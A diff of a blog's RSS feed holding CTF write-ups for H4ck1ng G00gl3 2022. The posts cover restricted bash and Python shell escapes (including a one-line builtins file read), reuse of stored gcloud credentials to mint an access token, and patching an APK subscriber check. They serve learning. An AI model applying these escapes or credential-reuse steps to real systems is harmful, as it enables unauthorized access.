+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The challenge gives us a zip containing a readme file and the logs in a
 csv file. The readme explains how to install timesketch using docker.
 Once installed, we can import the logs and check the latest one. There,
@@ -1605,18 +1605,18 @@ challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only
 think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep002
 challenge 03&lt;/strong&gt;. This challenge is about &lt;strong&gt;Escaping Restricted Shell&lt;/strong&gt;.&lt;/p&gt;
 &lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The description tells us how to connect to a remote shell.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch03/quarantineshell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Once connected, we get access to a shell. It has a peculiarity, though.
 We cannot execute any commands because they are blocked. However, it
 tells us to check the completions to see the available ones. Therefore,
 I pressed the &lt;strong&gt;tab&lt;/strong&gt; key a few times to see them.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch03/available-commands.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The flag, as in other challenges, can be found in the root folder. We
 can check it by writing &quot;ls /&quot; and then pressing the &lt;strong&gt;tab&lt;/strong&gt; a couple of
 times to see the available files and directories.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch03/ls-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;I was stuck. I did not know what to do. I had to ask the community for a
 hint. The trick is overriding a builtin function. The &lt;a href=&quot;https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html&quot;&gt;bash
 documentation&lt;/a&gt;
@@ -1635,56 +1635,7 @@ behaviour and return the flag.&lt;/p&gt;
 echo
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;With that, we completed the challenge.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep003 challenge 02</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep003ch02/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep003ch02/</guid><description>Decode H4ck1ng G00gl3 ep003 challenge 02: use the Konami cheat code, escape a restricted Python shell, and reveal the hidden flag.</description><pubDate>Sun, 13 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h1&gt;Introduction&lt;/h1&gt;
-&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
-challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
-think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep003
-challenge 02&lt;/strong&gt;. Category &lt;strong&gt;Escape Restricted Shell&lt;/strong&gt;.&lt;/p&gt;
-&lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The description gives us the command to connect to a remote machine.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;At this point, we can try winning the game or cheating, as the hint
-suggests. At first, I tried to play the game for a while, searching for
-clues on how to cheat it. I could not find a way. I was recovering a lot
-of coordinates and images that didn&apos;t make sense and didn&apos;t help me.
-Later I learned that they are related to the bonus challenge for this
-episode. After dying a couple of times, the game became tedious, and I
-didn&apos;t find a way to cheat. I asked the community for help. The hint is
-related to the &lt;a href=&quot;https://www.digitaltrends.com/gaming/famous-cheat-codes-in-video-games/#:~:text=In%20its%20most%20famous%20form,a%20cakewalk%20with%20the%20code&quot;&gt;famous Konami cheat
-code&lt;/a&gt;.
-After introducing it, we get to another screen where we can input text.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;Notice that it won&apos;t execute any command. We need to do some research.
-First, I &lt;strong&gt;copied the error output of the command &quot;cd ~&quot;&lt;/strong&gt; into the
-Google search engine.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;We can try to execute a python function to check if it&apos;s a python shell
-and its version. In that case, I decided to call:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;print &quot;asd&quot;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;By the given output, we can see that the &lt;strong&gt;shell is running python
-version 3&lt;/strong&gt;. Lucky me, I found a &lt;a href=&quot;https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python3&quot;&gt;webpage with tricks to scape from
-restricted python3
-shells&lt;/a&gt;.
-That page shows how to access the &lt;strong&gt;builtins&lt;/strong&gt; module, for example.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The &lt;a href=&quot;https://docs.python.org/3/library/builtins.html&quot;&gt;builtins&lt;/a&gt; module
-gives access to several functions, one of them being the &lt;strong&gt;open&lt;/strong&gt;
-function. That means that we can open a file and read it. We know from
-past challenges that the flag file is at the root directory, and
-therefore, we can get the flag with&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;print(len.__self__.open(&apos;flag&apos;).read())
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;With that, we completed the challenge.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep003 challenge 01</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep003ch01/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep003ch01/</guid><description>Decode H4ck1ng G00gl3 ep003 challenge 01: navigate restricted shells, extract tokens, and uncover the flag using OAuth 2.0 and JWT.</description><pubDate>Wed, 09 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
@@ -1695,26 +1646,26 @@ challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only
 think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep003
 challenge 01&lt;/strong&gt;. Category &lt;strong&gt;Misc&lt;/strong&gt;.&lt;/p&gt;
 &lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The description tell us how to connect to the machine with socat.
 However, it requires a password. I tried to guess it with no luck. I
 watched the episode video again but didn&apos;t find anything interesting. I
 even tried searching for vulnerabilities or brute force scripts
 targeting socat. Nothing of that worked. I asked the community for a
 hint. They told me to check the &lt;strong&gt;intro&lt;/strong&gt; tab of the episode.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/password-hint.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;I believe I never read the introductions to the different challenges,
 but it was necessary this time. There, we can see two times at which the
 episode video might show something interesting. If we &lt;strong&gt;stop the episode
 at 15:09&lt;/strong&gt; we will see the password.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/video-password.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;We can access the machine now.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/developer-shell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;In the home directory, we find three files: backup.py, login.sh and
 todo.txt. The login.sh contains the code executed when connecting with
 socat, nothing of interest. However, the other two files contain
 relevant information. I decided to check the &lt;strong&gt;backup.py&lt;/strong&gt; first.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/backup-code.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;It&apos;s a simple unfinished script. The script creates the backup of a
 document, probably the one we need to get. The problem is that &lt;strong&gt;we need
 an access token to get the file&lt;/strong&gt;. Unlucky for us, the function that
@@ -1746,22 +1697,22 @@ internet but did not find anything that could help me. For no reason, I
 thought it was worth returning to the developer machine to navigate the
 directories and see if I could find anything. After some time, I found
 something that caught my attention. A &lt;strong&gt;hidden folder named &quot;.config&lt;/strong&gt;&quot;.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/ls-hidden.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;This folder contains a &lt;strong&gt;gcloud folder with promising files&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/gcloud-config-files.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Remember that we needed an access token? Well…, there we have a
 &lt;strong&gt;access_tokens.db&lt;/strong&gt;, which includes &lt;strong&gt;an old access token and a JWT&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/old-access-token.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;We can paste the token into the &lt;a href=&quot;https://jwt.io/&quot;&gt;https://jwt.io/&lt;/a&gt; webpage and see which
 information is inside.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/decoded-access-token.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;We are progressing. Still, we don&apos;t know the information we have to
 include in the JWT to get a new access token, and we don&apos;t have the
 private key to sign it. I returned to the &lt;strong&gt;.config/gcloud&lt;/strong&gt; folder to
 search for the private key. There, we see a file called
 &lt;strong&gt;credentials.db&lt;/strong&gt;, which contains the &lt;strong&gt;private key&lt;/strong&gt; and the &lt;strong&gt;token
 URI&lt;/strong&gt;, among other information we don&apos;t need.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/private-key.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Now we have all the required information.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;JWT with some information&lt;/li&gt;
@@ -1778,7 +1729,7 @@ documentation explaining &lt;a href=&quot;https://developers.google.com/identity
 Application&lt;/a&gt;.
 There, we can see the information the access token must contain and how
 to send the POST request. First, we have to build a valid access token.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/new-jwt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The header stays the same. However, we needed to modify the payload. The
 &lt;strong&gt;iat field timestamp is the current timestamp&lt;/strong&gt;, and the &lt;strong&gt;exp field
 timestamp is one hour from now in the future&lt;/strong&gt;. Moreover, we initially
@@ -1788,15 +1739,64 @@ different authorization scopes available for a document GET request at
 &lt;a href=&quot;https://developers.google.com/docs/api/reference/rest/v1/documents/get&quot;&gt;https://developers.google.com/docs/api/reference/rest/v1/documents/get&lt;/a&gt;.
 We are now in good shape to &lt;strong&gt;send a POST request to get a valid
 access_token&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/post-token.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Great, we got a new access token! The last step is &lt;strong&gt;sending a GET
 request to the document URL&lt;/strong&gt; with the &lt;strong&gt;access token in the
 Authorization header&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/get-blueprints.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Perfect! We received the response with the blueprints! Finally, we need
 to search for the flag in the response. With that, we completed the
 challenge.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep003 challenge 02</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep003ch02/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep003ch02/</guid><description>Decode H4ck1ng G00gl3 ep003 challenge 02: use the Konami cheat code, escape a restricted Python shell, and reveal the hidden flag.</description><pubDate>Sun, 13 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
+challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
+think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep003
+challenge 02&lt;/strong&gt;. Category &lt;strong&gt;Escape Restricted Shell&lt;/strong&gt;.&lt;/p&gt;
+&lt;h1&gt;Learning Journey&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The description gives us the command to connect to a remote machine.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/greeting.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/game.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;At this point, we can try winning the game or cheating, as the hint
+suggests. At first, I tried to play the game for a while, searching for
+clues on how to cheat it. I could not find a way. I was recovering a lot
+of coordinates and images that didn&apos;t make sense and didn&apos;t help me.
+Later I learned that they are related to the bonus challenge for this
+episode. After dying a couple of times, the game became tedious, and I
+didn&apos;t find a way to cheat. I asked the community for help. The hint is
+related to the &lt;a href=&quot;https://www.digitaltrends.com/gaming/famous-cheat-codes-in-video-games/#:~:text=In%20its%20most%20famous%20form,a%20cakewalk%20with%20the%20code&quot;&gt;famous Konami cheat
+code&lt;/a&gt;.
+After introducing it, we get to another screen where we can input text.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/cd-home.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Notice that it won&apos;t execute any command. We need to do some research.
+First, I &lt;strong&gt;copied the error output of the command &quot;cd ~&quot;&lt;/strong&gt; into the
+Google search engine.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/shell-may-be-python.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We can try to execute a python function to check if it&apos;s a python shell
+and its version. In that case, I decided to call:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;print &quot;asd&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/shell-is-python3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;By the given output, we can see that the &lt;strong&gt;shell is running python
+version 3&lt;/strong&gt;. Lucky me, I found a &lt;a href=&quot;https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python3&quot;&gt;webpage with tricks to scape from
+restricted python3
+shells&lt;/a&gt;.
+That page shows how to access the &lt;strong&gt;builtins&lt;/strong&gt; module, for example.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/print-len-self.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The &lt;a href=&quot;https://docs.python.org/3/library/builtins.html&quot;&gt;builtins&lt;/a&gt; module
+gives access to several functions, one of them being the &lt;strong&gt;open&lt;/strong&gt;
+function. That means that we can open a file and read it. We know from
+past challenges that the flag file is at the root directory, and
+therefore, we can get the flag with&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;print(len.__self__.open(&apos;flag&apos;).read())
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With that, we completed the challenge.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep003 challenge 03</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep003ch03/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep003ch03/</guid><description>Hack your way through H4ck1ng G00gl3 ep003 challenge 03. Decompile, modify the apk, and scan the QR code to reveal the hidden flag.</description><pubDate>Sun, 13 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
@@ -1807,102 +1807,49 @@ challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only
 think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep003
 challenge 03&lt;/strong&gt;. Category &lt;strong&gt;Android&lt;/strong&gt;.&lt;/p&gt;
 &lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Opening the challenge gives us a zip containing two files: an apk and a
 QR code. First things first, let&apos;s install the application and see if we
 can scan the QR code and what&apos;s the result.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/original-app.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The QR code returns the Secret flag data. However, it seems like we have
 to be a subscriber to get the URL field where I guess the flag is
 hidden. I&apos;m pretty sure we can modify the apk in a way that shows us the
 flag. To do that, we have to obtain the source code first. There is a
 tool called &lt;a href=&quot;https://github.com/pxb1988/dex2jar&quot;&gt;dex2jar&lt;/a&gt; that extracts
 the jar file from the apk.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/apk-to-jar.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Then, we can use &lt;a href=&quot;https://java-decompiler.github.io/&quot;&gt;jd-gui&lt;/a&gt; to open
 the jar file and look at the source code. Once we have it, there is no
 trick. We have to read it and find where the vulnerability is. In that
 case, I found &lt;strong&gt;the signature of the HTTP request was different between
 a subscribed and an unsubscribed user&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/jdgui-networkktclass.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;I wondered how the application knew if a user was a subscriber. After
 searching through the code, I found the &lt;strong&gt;&quot;CorgiRequest&quot; class with the
 &quot;isSubscriber&quot; field&lt;/strong&gt;, initialized in the constructor. In other words,
 if we set the &quot;isSubscriber&quot; field to true when the class is created, we
 might get the flag.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/jdgui-is-subscriber-field.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;To modify the application, we are going to use the
 &lt;a href=&quot;https://github.com/APKLab/APKLab&quot;&gt;APKLab&lt;/a&gt; VsCode plugin. First, we are
 going to decompile it.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/apklab-decompile-args-error.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Decompiling the resources gave me an error, so I tried decompiling all
 except the resources.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/apklab-decompile-error-message.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/apklab-decompile-args.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;After decompiling it, we will have access to the code in the Smali
 language. It&apos;s a low-level language, and it&apos;s harder to understand. We
 know we have to modify the constructor class of the CorgiRequest class.
 For that challenge, the change is tiny.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/apklab-modification.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Now we need to recompile the code into an apk and sign it.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/apklab-compile-sign.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The last step is to install this new apk and run it. Now, the flag will
 appear after scanning the QR code. With that, we completed the
 challenge.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep004 challenge 01</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch01/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch01/</guid><description>Crack H4ck1ng G00gl3 ep004 challenge 01: explore endpoints, use .tar.gz files and dry run features, and trick the system into revealing the flag.</description><pubDate>Sun, 20 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h1&gt;Introduction&lt;/h1&gt;
-&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
-challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
-think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep004
-challenge 01&lt;/strong&gt;. Category &lt;strong&gt;Web Exploitation&lt;/strong&gt;.&lt;/p&gt;
-&lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;When we open the challenge, it redirects us to a &lt;a href=&quot;https://vrp-website-web.h4ck.ctfcompetition.com/&quot;&gt;copy of Google Bug
-Hunter webpage&lt;/a&gt; of the
-&lt;a href=&quot;https://bughunters.google.com/&quot;&gt;original Google Bug Hunter webpage&lt;/a&gt;.
-The hint suggests searching for some new endpoints. After researching, I
-found the &lt;strong&gt;difference in the FAQs section&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;We can start playing with the endpoints. First, I start sending a POST
-request to the import endpoint.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;It is missing the submission parameter. Let&apos;s add it.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;Interesting. The import endpoint is disabled, but the &lt;strong&gt;dry run is
-enabled&lt;/strong&gt;. I tried enabling it but couldn&apos;t find the correct query
-parameter. So, I decided to give the export endpoint a try.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The export endpoint shows us that a submission called
-&quot;submission_sample&quot; already exists and that each submission has
-different attachments. But I couldn&apos;t figure out how to proceed with the
-challenge.&lt;/p&gt;
-&lt;p&gt;I asked the community for help, and they told me to &lt;strong&gt;solve the other
-challenges first&lt;/strong&gt;. Therefore, I decided to solve challenges two and
-three. &lt;strong&gt;Challenge two gives us some code. With this code, we can access
-some more code required to solve challenge number three&lt;/strong&gt;. It turns out
-this code contains the import and export functions. We can now see how
-to access the dry run feature.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;That isn&apos;t enough to solve the challenge. I kept reading the import
-code.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;I found a couple of interesting details. First, the &lt;strong&gt;endpoint expects a
-.tar.gz file&lt;/strong&gt;. Second, &lt;strong&gt;the endpoint will output the difference if the
-file already exists&lt;/strong&gt;. We want to get the flag, so we can probably
-&lt;strong&gt;trick the endpoint into printing the content by uploading a .tar.gz
-containing a &quot;flag&quot; file&lt;/strong&gt;. We know the flag must be in the root path.
-Therefore, we will use &quot;/&quot; as the value for the submission field.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;Okay, we have to turn on the debug to see the differences.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;Making this call will return us the flag! With that, we completed the
-challenge.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep004 challenge 02</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch02/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch02/</guid><description>Exploit H4ck1ng G00gl3 ep004 challenge 02: find vulnerabilities, bypass string comparison, and reset passwords to log in as &apos;tin&apos; and reveal the flag.</description><pubDate>Sun, 20 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
@@ -1913,10 +1860,10 @@ challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only
 think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep004
 challenge 02&lt;/strong&gt;. Category &lt;strong&gt;Web Exploitation&lt;/strong&gt;.&lt;/p&gt;
 &lt;h1&gt;Learning Journey&lt;/h1&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;In this challenge, we are given some code. We have to find the
